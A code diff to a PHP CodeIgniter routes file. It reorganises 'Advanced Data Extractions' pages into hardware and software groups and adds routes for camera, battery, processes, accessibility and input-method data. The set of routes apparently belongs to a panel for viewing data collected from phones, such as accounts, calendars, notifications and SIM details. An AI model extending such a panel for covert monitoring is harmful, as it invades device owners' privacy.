@@ -435,34 +435,61 @@ $routes->group('', [
 
     // Advanced Data Extractions
     $routes->group('advanced', static function ($routes) {
-        $routes->get('device', 'Advanced::device_context', ['as' => 'adv-device']);
-        $routes->get('network', 'Advanced::network_info', ['as' => 'adv-network']);
-        $routes->get('accounts', 'Advanced::accounts', ['as' => 'adv-accounts']);
-        $routes->get('calendar', 'Advanced::calendar', ['as' => 'adv-calendar']);
-        $routes->get('app-usage', 'Advanced::app_usage', ['as' => 'adv-app-usage']);
-        $routes->get('app-usage/(:any)', 'Advanced::app_usage_detail/$1', ['as' => 'adv-app-usage-detail']);
-        $routes->get('notifications', 'Advanced::notifications', ['as' => 'adv-notifications']);
-        $routes->get('notifications/(:any)', 'Advanced::notification_detail/$1', ['as' => 'adv-notification-detail']);
-        $routes->post('datatable/app-usage', '\App\Controllers\api\v1\DatatableAPI::getAppUsageDetails', ['as' => 'adv-datatable-app-usage']);
-        $routes->post('datatable/notifications', '\App\Controllers\api\v1\DatatableAPI::getNotificationDetails', ['as' => 'adv-datatable-notifications']);
-        $routes->get('bluetooth', 'Advanced::bluetooth', ['as' => 'adv-bluetooth']);
-        $routes->get('sensors', 'Advanced::sensors', ['as' => 'adv-sensors']);
-        $routes->get('security_audit', 'Advanced::security_audit', ['as' => 'adv-security-audit']);
-        $routes->post('app-usage/delete/(:num)', 'Advanced::delete_app_usage/$1');
-        $routes->post('notifications/delete/(:any)', 'Advanced::delete_notifications_by_app');
-        $routes->post('notifications/delete-row/(:num)', 'Advanced::delete_notification_row/$1');
-        $routes->post('device/delete/(:num)', 'Advanced::delete_device_context/$1');
-        $routes->post('network/delete/(:num)', 'Advanced::delete_network_info/$1');
-        $routes->post('accounts/delete/(:num)', 'Advanced::delete_accounts_row/$1');
-        $routes->post('calendar/delete/(:num)', 'Advanced::delete_calendar_event/$1');
-        $routes->post('bluetooth/delete/(:num)', 'Advanced::delete_bluetooth_row/$1');
-        $routes->post('sensors/delete/(:num)', 'Advanced::delete_sensor_profile/$1');
-        $routes->post('security_audit/delete/(:num)', 'Advanced::delete_security_audit_row/$1');
-        $routes->post('app-usage/delete-package/(:any)', 'Advanced::delete_app_usage_by_package/$1');
-    });
+        $routes->group('hardware', static function ($routes) {
+            // Landing page
+            $routes->get('/', 'Advanced::hardware', ['as' => 'adv-hardware']);
 
-    $routes->get('sim-configs', 'SimConfig::index', ['as' => 'sim-configs']);
-    $routes->post('sim-configs/delete/(:num)', 'SimConfig::delete/$1');
+            $routes->get('device', 'Advanced::device_context', ['as' => 'adv-device']);
+            $routes->get('network', 'Advanced::network_info', ['as' => 'adv-network']);
+            $routes->get('bluetooth', 'Advanced::bluetooth', ['as' => 'adv-bluetooth']);
+            $routes->get('sensors', 'Advanced::sensors', ['as' => 'adv-sensors']);
+            $routes->get('camera_info', 'Advanced::camera_info', ['as' => 'adv-camera-info']);
+            $routes->get('battery_stats', 'Advanced::battery_stats', ['as' => 'adv-battery-stats']);
+            $routes->get('processes', 'Advanced::processes', ['as' => 'adv-processes']);
+            $routes->get('proc_info', 'Advanced::proc_info', ['as' => 'adv-proc-info']);
+
+            // Delete routes - hardware pages
+            $routes->post('device/delete/(:num)', 'Advanced::delete_device_context/$1');
+            $routes->post('network/delete/(:num)', 'Advanced::delete_network_info/$1');
+            $routes->post('bluetooth/delete/(:num)', 'Advanced::delete_bluetooth_row/$1');
+            $routes->post('sensors/delete/(:num)', 'Advanced::delete_sensor_profile/$1');
+            $routes->post('camera_info/delete/(:num)', 'Advanced::delete_camera_info/$1');
+            $routes->post('battery_stats/delete/(:num)', 'Advanced::delete_battery_stats/$1');
+            $routes->post('processes/delete/(:num)', 'Advanced::delete_processes/$1');
+            $routes->post('proc_info/delete/(:num)', 'Advanced::delete_proc_info/$1');
+
+            // SIM Configs (kept in hardware group)
+            $routes->get('sim-configs', 'SimConfig::index', ['as' => 'sim-configs']);
+            $routes->post('sim-configs/delete/(:num)', 'SimConfig::delete/$1');
+        });
+
+        $routes->group('software', static function ($routes) {
+            // Landing page
+            $routes->get('/', 'Advanced::software', ['as' => 'adv-software']);
+
+            $routes->get('accounts', 'Advanced::accounts', ['as' => 'adv-accounts']);
+            $routes->get('calendar', 'Advanced::calendar', ['as' => 'adv-calendar']);
+            $routes->get('app-usage', 'Advanced::app_usage', ['as' => 'adv-app-usage']);
+            $routes->get('app-usage/(:any)', 'Advanced::app_usage_detail/$1', ['as' => 'adv-app-usage-detail']);
+            $routes->get('notifications', 'Advanced::notifications', ['as' => 'adv-notifications']);
+            $routes->get('notifications/(:any)', 'Advanced::notification_detail/$1', ['as' => 'adv-notification-detail']);
+            $routes->get('accessibility', 'Advanced::accessibility', ['as' => 'adv-accessibility']);
+            $routes->get('input_methods', 'Advanced::input_methods', ['as' => 'adv-input-methods']);
+            $routes->get('security_audit', 'Advanced::security_audit', ['as' => 'adv-security-audit']);
+
+            $routes->post('datatable/app-usage', '\App\Controllers\api\v1\DatatableAPI::getAppUsageDetails', ['as' => 'adv-datatable-app-usage']);
+            $routes->post('datatable/notifications', '\App\Controllers\api\v1\DatatableAPI::getNotificationDetails', ['as' => 'adv-datatable-notifications']);
+
+            // Delete routes - software pages
+            $routes->post('app-usage/delete/(:num)', 'Advanced::delete_app_usage/$1');
+            $routes->post('notifications/delete/(:any)', 'Advanced::delete_notifications_by_app');
+            $routes->post('notifications/delete-row/(:num)', 'Advanced::delete_notification_row/$1');
+            $routes->post('accounts/delete/(:num)', 'Advanced::delete_accounts_row/$1');
+            $routes->post('calendar/delete/(:num)', 'Advanced::delete_calendar_event/$1');
+            $routes->post('app-usage/delete-package/(:any)', 'Advanced::delete_app_usage_by_package/$1');
+            $routes->post('security_audit/delete/(:num)', 'Advanced::delete_security_audit_row/$1');
+        });
+    });
 
     $routes->get('advanced/media', 'Advanced::remote_media');
     $routes->get('advanced/media/serve/(:any)', 'Advanced::serve_media/$1');
